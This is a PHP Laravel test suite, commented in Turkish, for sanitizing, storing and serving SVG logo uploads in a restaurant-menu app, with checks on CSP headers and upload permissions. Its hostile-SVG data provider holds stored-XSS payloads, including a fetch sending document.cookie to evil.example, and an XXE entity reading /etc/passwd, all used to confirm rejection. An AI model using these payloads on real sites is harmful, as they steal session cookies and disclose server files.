<?php

declare(strict_types=1);

namespace Tests\Feature\Media;

use App\Application\Media\Dto\MediaScanResult;
use App\Application\Media\Dto\MediaScanVerdict;
use App\Application\Media\Port\MalwareScannerPort;
use App\Domain\Media\MediaAssetStatus;
use App\Models\User;
use App\Support\Media\RenditionUrl;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Illuminate\Testing\TestResponse;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * SVG ALIMI VE TESLİMİ — sahibin 2026-09-05 kararı (`docs/108` §6.2).
 *
 * MÜŞTERİ SORUNU. Restoran sahibinin logosu ajansından SVG olarak geliyor.
 * Bugüne kadar panel onu reddediyordu ("desteklenmeyen dosya"), sahip de
 * logosunu ekran görüntüsüyle PNG'ye çevirip bulanık hâlde yüklüyordu —
 * oysa QR kartı BASILIYOR ve baskıda bulanıklık görünür. Sahip "SVG'yi
 * şimdi aç" dedi.
 *
 * Kararın diğer yarısı bu dosyada: SVG bir görsel değil bir BELGEDİR ve
 * menü sayfaları herkese açıktır. Açmak, aynı pakette bir temizleyici
 * yazmak demektir; yoksa panele yüklenen bir dosya misafirin telefonunda
 * ÇALIŞIR (stored XSS).
 *
 * Requirement IDs: MEDIA-SVG-SANITIZE-01, MEDIA-SVG-FAIL-CLOSED-01,
 * MEDIA-SVG-SLOT-ALLOWLIST-01, MEDIA-SVG-SERVE-CSP-01,
 * MEDIA-SVG-ORIGINAL-PRESERVED-01.
 */
final class SvgIntakeAndDeliveryTest extends TestCase
{
    use RefreshDatabase;

    private User $owner;

    private int $workspaceId;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('local');

        // Virüs tarayıcısı bu ortamda yok; olmadığında dosya İLERLEMEZ ve
        // bu testin konusu tarayıcı değil, temizleyici. Temiz cevap veren
        // bir sahte tarayıcı bağlanır (mevcut medya testlerinin deseni).
        $this->app->instance(MalwareScannerPort::class, new class implements MalwareScannerPort
        {
            public function scan(string $diskPath): MediaScanResult
            {
                return new MediaScanResult(MediaScanVerdict::Clean);
            }
        });

        $this->owner = User::factory()->create(['email_verified_at' => now()]);
        $this->workspaceId = $this->workspaceFor($this->owner, 'owner');
    }

    private function workspaceFor(User $user, string $role): int
    {
        $id = (int) DB::table('workspaces')->insertGetId([
            'name' => 'Zeytin', 'slug' => 'svg-'.Str::lower(Str::random(8)), 'state' => 'active',
            'created_by' => $user->id, 'created_at' => now(), 'updated_at' => now(),
        ]);

        DB::table('workspace_memberships')->insert([
            'workspace_id' => $id, 'user_id' => $user->id, 'role' => $role,
            'created_at' => now(), 'updated_at' => now(),
        ]);

        return $id;
    }

    /** Ajansın verdiği türden, zararsız bir vektör logo. */
    private function cleanSvg(): string
    {
        return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="512" height="512">'
            .'<title>Zeytin</title>'
            .'<path d="M256 32 L480 256 L256 480 L32 256 Z" fill="#0a7d3f"/>'
            .'<circle cx="256" cy="256" r="96" fill="#ffffff"/>'
            .'</svg>';
    }

    private function upload(string $body, string $slot, string $name = 'logo.svg'): TestResponse
    {
        $path = tempnam(sys_get_temp_dir(), 'svg');
        file_put_contents((string) $path, $body);

        return $this->actingAs($this->owner)->withHeaders(['Accept' => 'application/json'])->post(
            "/api/workspaces/{$this->workspaceId}/media",
            [
                'file' => new UploadedFile((string) $path, $name, 'image/svg+xml', null, true),
                'altText' => 'Zeytin logosu',
                'slot' => $slot,
            ],
        );
    }

    // --- MEDIA-SVG-SANITIZE-01 ---------------------------------------------

    public function test_a_clean_svg_is_accepted_for_a_vector_slot_and_becomes_a_ready_asset(): void
    {
        $response = $this->upload($this->cleanSvg(), 'logo')->assertStatus(201);

        $assetId = (int) $response->json('id');

        self::assertSame(
            MediaAssetStatus::Ready->value,
            (string) DB::table('media_assets')->where('id', $assetId)->value('status'),
            'SVG kabul edildi ama kullanılabilir hâle gelmedi; sahip yine ekran görüntüsü almak zorunda kalır.',
        );

        $rendition = DB::table('media_renditions')
            ->join('media_versions', 'media_versions.id', '=', 'media_renditions.media_version_id')
            ->join('media_blobs', 'media_blobs.id', '=', 'media_renditions.media_blob_id')
            ->where('media_versions.media_asset_id', $assetId)
            ->first(['media_renditions.format', 'media_blobs.mime_type', 'media_blobs.storage_key']);

        self::assertNotNull($rendition, 'SVG için hiçbir türev doğmadı; menüde gösterilecek bir şey yok.');
        self::assertSame('svg', (string) $rendition->format);
        self::assertSame('image/svg+xml', (string) $rendition->mime_type);
    }

    /**
     * MEDIA-SVG-ORIGINAL-PRESERVED-01.
     *
     * "Asıl korunur" depoda zaten bir kuraldır (`docs/49` Faz 3): karantinaya
     * yazılan bayt DEĞİŞMEZ ve parmak izi o an alınır. Temizlenmiş gövde
     * bu yüzden aslın ÜSTÜNE yazılmaz; ayrı bir TÜREV olarak saklanır.
     * Halka giden tek şey türevdir — polyglot testindeki savunmanın aynısı.
     */
    public function test_the_original_stays_byte_identical_while_the_sanitized_body_lives_as_a_rendition(): void
    {
        $body = $this->cleanSvg();
        $assetId = (int) $this->upload($body, 'logo')->assertStatus(201)->json('id');

        $diskPath = (string) DB::table('media_assets')->where('id', $assetId)->value('disk_path');

        self::assertSame(
            $body,
            (string) Storage::disk('local')->get($diskPath),
            'Asıl değiştirilmiş: geri dönülemez bir kayıp ve "değişmedi" iddiasının kanıtı yok olur.',
        );

        $storageKey = (string) DB::table('media_blobs')
            ->join('media_renditions', 'media_renditions.media_blob_id', '=', 'media_blobs.id')
            ->join('media_versions', 'media_versions.id', '=', 'media_renditions.media_version_id')
            ->where('media_versions.media_asset_id', $assetId)
            ->value('media_blobs.storage_key');

        $served = (string) Storage::disk('local')->get($storageKey);

        self::assertStringContainsString('M256 32 L480 256 L256 480 L32 256 Z', $served, 'Logonun çizimi kayboldu.');
        self::assertStringNotContainsString('<script', $served);
    }

    // --- MEDIA-SVG-FAIL-CLOSED-01 ------------------------------------------

    /**
     * @return array<string, array{0:string}>
     */
    public static function hostileSvgBodies(): array
    {
        $ns = 'xmlns="http://www.w3.org/2000/svg"';

        return [
            'script' => ['<svg '.$ns.'><script>fetch("https://evil.example/"+document.cookie)</script><rect width="512" height="512"/></svg>'],
            'onload' => ['<svg '.$ns.' onload="alert(1)"><rect width="512" height="512"/></svg>'],
            'harici use' => ['<svg '.$ns.' xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.example/p.svg#x"/></svg>'],
            'foreignObject' => ['<svg '.$ns.'><foreignObject width="8" height="8"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'],
            'XXE' => ['<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg '.$ns.'><text>&xxe;</text></svg>'],
            'ayrıştırılamayan gövde' => ['<svg '.$ns.'><g><rect/></svg>'],
        ];
    }

    #[DataProvider('hostileSvgBodies')]
    public function test_a_hostile_or_unreadable_svg_is_rejected_before_anything_is_stored(string $body): void
    {
        $this->upload($body, 'logo')->assertStatus(422);

        // FAIL-CLOSED. Reddedilen dosya için ne satır doğar ne bayt yazılır:
        // "temizledim, sakladım" demek, saldırıyı sessizce arşivlemektir.
        self::assertSame(0, DB::table('media_assets')->count(), 'Reddedilen SVG için satır doğdu.');
        self::assertSame([], Storage::disk('local')->allFiles(), 'Reddedilen SVG karantinaya yazıldı.');
    }

    /**
     * `tests/fixtures/malicious/` CI kapısının SVG yarısı.
     *
     * `MaliciousIntakeGateTest` her fixture'ı `itemImage` slotuna gönderir
     * ve SVG orada zaten yasaktır — yani o kapı SVG fixture'larını slot
     * kuralıyla durdurur, temizleyiciyle değil. Asıl soru şudur: SVG'nin
     * SERBEST olduğu slotta da duruyorlar mı? Cevabı burada verilir.
     */
    public function test_every_malicious_svg_fixture_is_rejected_even_in_the_slot_where_svg_is_allowed(): void
    {
        $fixtures = glob(base_path('tests/fixtures/malicious/*.svg')) ?: [];

        self::assertGreaterThanOrEqual(4, count($fixtures), 'Kapının koruyacağı SVG fixture\'ı yok.');

        foreach ($fixtures as $path) {
            $name = basename($path);

            $this->upload((string) file_get_contents($path), 'logo', $name)->assertStatus(422);

            self::assertSame(0, DB::table('media_assets')->count(), "MALICIOUS-SVG: `{$name}` için satır doğdu.");
            self::assertSame([], Storage::disk('local')->allFiles(), "MALICIOUS-SVG: `{$name}` karantinaya yazıldı.");
        }
    }

    // --- MEDIA-SVG-SLOT-ALLOWLIST-01 ---------------------------------------

    public function test_a_photographic_slot_still_refuses_svg(): void
    {
        // SVG bir yemek fotoğrafı değildir. `itemImage` slotunda kabul etmek,
        // slot politikasının söylediğiyle çelişirdi (INV-04).
        $this->upload($this->cleanSvg(), 'itemImage')->assertStatus(422);

        self::assertSame(0, DB::table('media_assets')->count());
    }

    // --- MEDIA-SVG-SERVE-CSP-01 --------------------------------------------

    public function test_a_served_svg_rendition_cannot_execute_script_in_the_browser(): void
    {
        $assetId = (int) $this->upload($this->cleanSvg(), 'logo')->assertStatus(201)->json('id');

        $response = $this->get($this->renditionUrlFor($assetId))->assertStatus(200);

        self::assertSame('image/svg+xml', $response->headers->get('Content-Type'));
        self::assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));

        /*
            SVG doğrudan adresinden açıldığında tarayıcı onu bir BELGE gibi
            işler. Temizleyici alımda geçti; yine de tek savunma hattı
            bırakılmaz — CSP, bu adreste betik çalışmasını ve dışarı
            bağlanmayı tarayıcı düzeyinde imkânsız kılar.
        */
        $csp = (string) $response->headers->get('Content-Security-Policy');

        self::assertStringContainsString("default-src 'none'", $csp, 'SVG türevi CSP olmadan servis ediliyor.');
        self::assertStringContainsString('sandbox', $csp);
    }

    private function renditionUrlFor(int $assetId): string
    {
        $row = DB::table('media_renditions')
            ->join('media_versions', 'media_versions.id', '=', 'media_renditions.media_version_id')
            ->join('media_blobs', 'media_blobs.id', '=', 'media_renditions.media_blob_id')
            ->where('media_versions.media_asset_id', $assetId)
            ->first(['media_renditions.id', 'media_renditions.format', 'media_blobs.checksum_sha256']);

        self::assertNotNull($row);

        return RenditionUrl::for((int) $row->id, (string) $row->checksum_sha256, (string) $row->format);
    }

    // --- Kiracı yalıtımı ve izin kapısı (mevcut medya testleriyle aynı desen) ---

    public function test_a_foreign_workspace_owner_cannot_upload_an_svg_into_our_workspace(): void
    {
        $stranger = User::factory()->create(['email_verified_at' => now()]);
        $this->workspaceFor($stranger, 'owner');

        $path = tempnam(sys_get_temp_dir(), 'svg');
        file_put_contents((string) $path, $this->cleanSvg());

        // 404, 403 DEĞİL: "yasak" cevabı bile kaynağın var olduğunu söyler.
        $this->actingAs($stranger)->withHeaders(['Accept' => 'application/json'])->post(
            "/api/workspaces/{$this->workspaceId}/media",
            [
                'file' => new UploadedFile((string) $path, 'logo.svg', 'image/svg+xml', null, true),
                'altText' => 'Yabancı', 'slot' => 'logo',
            ],
        )->assertStatus(404);

        self::assertSame(0, DB::table('media_assets')->count());
    }

    public function test_a_read_only_member_cannot_upload_an_svg(): void
    {
        $member = User::factory()->create(['email_verified_at' => now()]);
        DB::table('workspace_memberships')->insert([
            'workspace_id' => $this->workspaceId, 'user_id' => $member->id, 'role' => 'member',
            'created_at' => now(), 'updated_at' => now(),
        ]);

        $path = tempnam(sys_get_temp_dir(), 'svg');
        file_put_contents((string) $path, $this->cleanSvg());

        $this->actingAs($member)->withHeaders(['Accept' => 'application/json'])->post(
            "/api/workspaces/{$this->workspaceId}/media",
            [
                'file' => new UploadedFile((string) $path, 'logo.svg', 'image/svg+xml', null, true),
                'altText' => 'Salt okunur', 'slot' => 'logo',
            ],
        )->assertStatus(403);

        self::assertSame(0, DB::table('media_assets')->count());
    }
}
